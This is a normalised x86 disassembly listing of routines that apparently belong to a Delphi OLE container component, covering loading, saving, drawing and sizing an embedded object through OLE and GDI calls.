mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
test edi edi
je r-xdata
mov eax ebx
call sub_46d97c
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x220 ]
mov [ edi ] eax
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
xor edx edx
mov [ eax ] edx
sub_46cf78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
dec eax
je r-xdata
xor eax eax
jmp r-xdata
sub eax 0x3
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx eax
mov eax ebx
call sub_46e58c
xor eax eax
pop ebx
pop ebp
retn 0x18
mov al 0x1
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_46d970
sub_46cffc
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp edx 0x1
sbb ecx ecx
inc ecx
cmp cl [ eax + 0x258 ]
je r-xdata
xor eax eax
pop ebp
retn 0x8
mov [ eax + 0x258 ] cl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46d070
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov esi 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov eax ebx
call sub_46d970
test al al
jne r-xdata
xor esi esi
sub_46d0a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x23c ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x240 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_46d0ee
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_46e89c
xor eax eax
pop ebp
retn 0x4
sub_46d124
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x238 ]
call sub_405940
mov eax [ ebp + 0x10 ]
call sub_405928
cmp [ ebx + 0x284 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
call sub_43f7f4
mov eax ebx
call sub_43f6f8
add eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_43f6b4
add eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
call SetRect
push 0x3fff
push 0x3fff
push 0xffffc000
push 0xffffc000
mov eax [ ebp + 0x18 ]
push eax
call SetRect
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41613c
push esi
push edi
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x18 ]
push esi
mov esi edi
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov eax ebx
call sub_46d5d4
xor eax eax
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebx + 0x238 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebx + 0x244 ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x248 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_46d354
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_40599c
xor eax eax
push ebp
push sub_46d433
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi 0x80004005
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
sub eax 0xfffffd6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d43a
lea eax [ ebp - 0x4 ]
call sub_405928
lea eax [ ebp + 0xc ]
call sub_405928
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp + 0xc ]
call sub_405928
push eax
push 0x0
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov esi eax
test esi esi
jne r-xdata
sub eax 0xfffffd6c
jmp r-xdata
mov [ ebx + 0x284 ] 0x1
lea eax [ ebx + 0x280 ]
mov edx [ ebp + 0xc ]
call sub_405940
push 0xffffffff
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax ebx
call sub_46ea7c
push 0xffffffff
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
xor esi esi
sub_46d443
add ch al
mov esp 0x4e68b722
sbb edx [ eax ]
mov [ 0xaa00bc ] al
inc eax
inc edi
jo r-xdata
call sub_43f490
mov dl 0x1
mov eax esi
call sub_446704
xor edx edx
mov eax esi
call sub_43fe74
mov [ esi + 0x250 ] 0x1
mov [ esi + 0x251 ] 0x1
mov [ esi + 0x252 ] 0x2
mov [ esi + 0x253 ] 0x1
mov [ esi + 0x254 ] 0x1
mov [ esi + 0x255 ] 0x1
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
push esi
test dl dl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4480f0
mov [ esi + 0x210 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov edx 0x79
mov eax esi
call sub_43f46c
mov edx 0x79
mov eax esi
sub_46d518
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_46d6e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44814c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46d55c
push ebx
add esp 0xfffffff8
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
pop ecx
pop edx
pop ebx
retn
cmp [ ebx + 0x257 ] 0x4
jne r-xdata
cmp [ ebx + 0x21c ] 0x0
je r-xdata
mov edx esp
lea eax [ ebx + 0x224 ]
call sub_46cc5c
mov eax ebx
call sub_46d940
add eax eax
mov edx [ esp ]
add edx eax
push edx
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_46d5d4
push ebx
add esp 0xfffffff4
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
add esp 0xc
pop ebx
retn
mov eax [ ebx + 0x238 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ eax + 0x248 ]
test eax eax
je r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp + 0x4 ] 0x2
mov [ esp + 0x8 ] 0x4
push esp
push 0x2
lea ecx [ ebx + 0x248 ]
lea edx [ ebx + 0x244 ]
call sub_453c7c
sub_46d65c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4437d8
push ebx
push sub_46de20
push ebx
push r-xdata
cmp [ ebx + 0x21c ] 0x0
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop esi
pop ebx
retn
sub_46d6c0
push ebx
mov ebx eax
mov eax [ ebx + 0x244 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call DestroyAcceleratorTable
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
sub_46d6e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46d810
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21c ] 0x0
je r-xdata
lea eax [ ebx + 0x280 ]
call sub_405928
lea eax [ ebx + 0x21c ]
call sub_405928
lea eax [ ebx + 0x218 ]
call sub_405928
lea eax [ ebx + 0x214 ]
call sub_405928
mov eax ebx
call sub_46d82c
mov eax ebx
call sub_46d6c0
cmp [ ebx + 0x234 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_46e9a4
cmp [ ebx + 0x230 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d817
lea eax [ ebp - 0x4 ]
call sub_405928
retn
mov eax [ ebx + 0x238 ]
cmp eax [ ebx + 0x234 ]
je r-xdata
push 0x1
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffb3
call sub_4034e4
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x234 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebx + 0x238 ]
call sub_405928
lea eax [ ebx + 0x234 ]
call sub_405928
mov edx ebx
mov eax [ ebx + 0x238 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebx + 0x230 ] eax
mov eax [ ebx + 0x230 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
lea eax [ ebp - 0x4 ]
call sub_405928
sub_46d878
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d5b0
test esi esi
jle r-xdata
cmp esi 0xffff0000
jne r-xdata
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
cmp [ ebx + 0x284 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebx + 0x22c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
mov eax ebx
call sub_46eb3c
mov edx esp
mov eax ebx
call sub_43f650
mov eax [ ebx + 0x30 ]
call sub_4464d0
mov edi eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
call sub_4464d0
mov edi eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
and ax 0xffff
movsx eax ax
mov esi eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
push eax
push 0x0
push esi
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
call sub_4611a0
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub eax 0xfffffd68
push esp
push edi
push 0x0
mov eax ebx
test eax eax
je r-xdata
sub_46d940
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor eax eax
retn
mov eax 0x1
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
retn
sub_46d97c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d5b0
xor esi esi
cmp [ ebx + 0x220 ] 0x4
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da4c
lea eax [ ebp - 0x4 ]
call sub_405928
retn
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
call sub_4611a0
push 0xffffffff
push 0x0
lea eax [ ebp - 0x34 ]
push eax
call OleGetIconOfClass
mov esi eax
mov [ ebp - 0x18 ] 0x3
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x8 ] 0x20
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_414a84
test al al
je r-xdata
mov esi [ ebp - 0x20 ]
sub_46da64
push ebx
push ecx
mov ebx eax
push esp
mov eax [ ebx + 0x214 ]
push eax
call GetHGlobalFromILockBytes
call sub_414a84
test al al
je r-xdata
xor eax eax
pop edx
pop ebx
retn
mov eax [ esp ]
push eax
call GlobalSize
pop edx
pop ebx
retn
sub_46daac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x253 ] 0x0
je r-xdata
mov eax ebx
call sub_4413f0
mov ebx eax
cmp [ ebx + 0x21c ] 0x0
je r-xdata
mov eax ebx
call sub_46da90
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
mov ebx [ ebx + 0x24c ]
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45437c
mov [ ebx + 0x24c ] eax
mov eax ebx
call sub_46da90
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dbbd
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f9e0
mov esi eax
mov eax ebx
call sub_46da90
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4518f4
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] sub_46e280
mov eax [ ebx + 0x24c ]
mov eax [ eax + 0x34 ]
mov edx esi
call sub_451e08
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_46dbc8
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
sub_46dbf0
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46ddb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_456c04
mov esi eax
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call sub_46dbc8
mov esi eax
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_46cdbc
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x234 ]
call sub_405940
lea eax [ ebx + 0x238 ]
mov edx [ ebx + 0x234 ]
call sub_405940
mov edx ebx
mov eax [ ebx + 0x234 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x234 ]
mov edx [ eax ]
call [ edx + 0x48 ]
call sub_46ce00
test al al
je r-xdata
mov eax ebx
call sub_456c2c
mov dl 0x1
mov eax ebx
call sub_46e9a4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_43fcb0
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_404864
mov eax [ ebp - 0x24 ]
call sub_404874
push eax
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f464
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
call sub_404864
mov eax [ ebp - 0x2c ]
call sub_404874
push eax
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xffffffff
mov eax [ ebx + 0x21c ]
push eax
call OleSetContainedObject
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
call sub_46cdbc
mov edx [ ebp - 0x20 ]
lea eax [ ebx + 0x238 ]
call sub_405940
mov edx ebx
mov eax [ ebx + 0x238 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ddbd
lea eax [ ebp - 0x30 ]
call sub_404038
lea eax [ ebp - 0x2c ]
call sub_404718
lea eax [ ebp - 0x28 ]
call sub_404038
lea eax [ ebp - 0x24 ]
call sub_404718
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404ac0
lea eax [ ebp - 0x4 ]
call sub_405928
retn
mov [ ebp - 0x18 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebx + 0x230 ]
push eax
test ebx ebx
je r-xdata
push ebx
push 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
sub ebx 0xfffffd70
sub_46ddc3
add [ esi ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4452c4
cmp [ ebx + 0x252 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
test [ esp ] 0x4
je r-xdata
mov edx 0xffff0000
mov eax ebx
call sub_46d878
or edx 0xffffffff
mov eax ebx
call sub_46d878
jmp r-xdata
mov [ esi ] 0x0
sub_46de20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46d6e8
lea edx [ ebp - 0x14 ]
mov ecx 0xc
mov eax ebx
call sub_419514
cmp [ ebp - 0x14 ] 0x434f4442
je r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x2
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x256 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_46df80
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
xor edx edx
push ebp
push j_sub_403a3c#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov ecx [ ebp - 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ded9
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
call sub_40b7cc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_46ded9
mov eax [ ebp - 0x4 ]
add eax 0x214
call sub_405928
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call CreateILockBytesOnHGlobal
call sub_4611a0
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405928
push eax
push 0x0
push 0x0
push 0x12
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call StgOpenStorageOnILockBytes
call sub_4611a0
mov eax [ ebp - 0x4 ]
add eax 0x21c
call sub_405928
push eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
call OleLoad
call sub_4611a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x220 ] edx
mov eax [ ebp - 0x4 ]
call sub_46dbf0
mov eax [ ebp - 0x4 ]
call sub_46ec10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0xfffffd68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46df85
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d6e8
call sub_403a9c
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
sub_46dfad
add [ eax ] al
add [ edx ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_441278
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_46e014
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov esi edx
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_46d940
push eax
push eax
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_46e058
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x284 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x1c ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41613c
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
cmp [ ebx + 0x259 ] 0x0
jne r-xdata
mov esi 0x4000
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x25c ] 0x0
je r-xdata
mov esi [ esp + 0x20 ]
sub esi [ esp + 0x18 ]
mov edi [ esp + 0x24 ]
sub edi [ esp + 0x1c ]
mov edx esp
lea eax [ ebx + 0x224 ]
call sub_46cc5c
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov esi 0xa00f
jmp r-xdata
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebx + 0x208 ]
call sub_420fdc
cmp [ ebx + 0x220 ] 0x4
je r-xdata
cmp [ ebx + 0x257 ] 0x2
jne r-xdata
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_420d54
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_420c38
or esi 0x800
push esi
push 0xa
lea eax [ esp + 0x20 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_42146c
push eax
call DrawEdge
cmp [ ebx + 0x21c ] 0x0
je r-xdata
mov esi 0x200f
jmp r-xdata
mov eax [ esp ]
sub esi eax
sar esi 0x1
jns r-xdata
cmp [ ebx + 0x257 ] 0x1
je r-xdata
mov eax esi
mov ebp [ esp + 0x4 ]
imul ebp
mov edx edi
mov ecx [ esp ]
imul edx ecx
cmp eax edx
jle r-xdata
mov [ esp + 0x8 ] esi
mov edx [ esp + 0x4 ]
sub edi edx
sar edi 0x1
jns r-xdata
adc esi 0x0
cmp [ ebx + 0x257 ] 0x2
jne r-xdata
mov eax ebp
imul esi
cdq
idiv ecx
mov [ esp + 0x4 ] eax
mov [ esp ] esi
mov eax ecx
imul edi
cdq
idiv ebp
mov [ esp ] eax
mov [ esp + 0x4 ] edi
jmp r-xdata
mov [ esp + 0xc ] edi
mov ecx [ esp + 0x8 ]
add ecx eax
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0xc ]
add eax edx
mov [ esp + 0x14 ] eax
jmp r-xdata
adc edi 0x0
cmp [ ebx + 0x257 ] 0x0
jne r-xdata
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_42146c
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ ebx + 0x21c ]
push eax
call OleDraw
cmp [ ebx + 0x258 ] 0x0
je r-xdata
push edi
push esi
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call SetRect
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call SetRect
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_42146c
push eax
call IntersectClipRect
jmp r-xdata
mov eax [ ebx + 0x208 ]
call sub_42146c
lea edx [ esp + 0x18 ]
call sub_46ccb8
sub_46e280
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov edx [ eax + 0xc ]
mov eax ebx
call sub_46d878
pop esi
pop ebx
retn
sub_46e2a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x80004002
push r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_40339c
test al al
je r-xdata
cmp [ ebx + 0x251 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
xor eax eax
mov [ ebp - 0x4 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub_46e320
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46e3b0
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebx + 0x21c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e3b7
lea eax [ ebp - 0x4 ]
call sub_405928
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x21c ]
mov ecx sub_46e3c0
call sub_40596c
push 0xffffffff
mov eax [ ebx + 0x218 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OleSave
call sub_4611a0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_405928
push 0x0
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_4611a0
mov [ ebx + 0x25b ] 0x0
